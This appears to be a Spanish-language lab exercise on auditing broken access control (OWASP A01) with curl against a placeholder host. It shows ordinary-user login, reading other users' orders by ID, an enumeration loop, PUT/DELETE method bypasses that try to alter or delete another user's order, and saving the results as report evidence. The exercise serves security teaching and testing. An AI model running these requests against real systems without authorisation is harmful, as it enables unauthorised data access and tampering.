# 13 - OSWAP-A01 [Reto] – curl como herramienta de auditoría

## Preparamos nuevamente el entorno

### Comprobamos la versión sobre la que trabajamos y creamos la carpeta de trabajo

curl --version
mkdir auditoria_a01
cd auditoria_a01

## Hacemos un reconocimiento pasivo sin logearnos

curl -i http://servidor/api/orders.php

### Si intentamos de esta forma entrar en el panel admin nos da el error 401

curl -i http://servidor/admin/dashboard.php

## Las autenticaciones y la gestion de sesiones

### Para el login como un usuario de a pie

curl -c cookies_user.txt
-d "username=usuario1&password=1234"
http://servidor/login.php

### Para un aacceso autenticado

curl -b cookies_user.txt -i http://servidor/api/profile.php

## Acceso a pedidos

### Para hacerlo a uno propio

curl -b cookies_user.txt -i
"http://servidor/api/order.php?id=1"

### Para hacerlo a uno ajeno

curl -b cookies_user.txt -i
"http://servidor/api/order.php?id=2"

### Enumeración automática de IDs

for i in 1 2 3 4 5; do
curl -s -o /dev/null
-w "ID=$i STATUS=%{http_code} SIZE=%{size_download}\n"
-b cookies_user.txt
"http://servidor/api/order.php?id=$i"
done

### Bypass por método HTTP (PUT / DELETE) intentando cambiarlo

curl -X PUT
-H "Content-Type: application/json"
-d '{"status":"CANCELLED"}'
-b cookies_user.txt
-i
"http://servidor/api/order.php?id=2"

### Bypass por método HTTP (PUT / DELETE) intentando borrarlo

curl -X DELETE
-b cookies_user.txt
-i
"http://servidor/api/order.php?id=2"

### Para intentar acceder a funciones admin con usuario normal

curl -b cookies_user.txt -i
http://servidor/admin/dashboard.php

## Las evidencias para los infomres

### Hay que guardar el header y el cuerpo

curl -b cookies_user.txt
-D evidencia_headers.txt
-o evidencia_body.txt
-w "STATUS=%{http_code}\nTIME=%{time_total}\n"
"http://servidor/api/order.php?id=2"

### Evidencia mínima reproducible

curl -s -o /dev/null
-w "STATUS=%{http_code}\n"
-b cookies_user.txt
"http://servidor/api/order.php?id=2"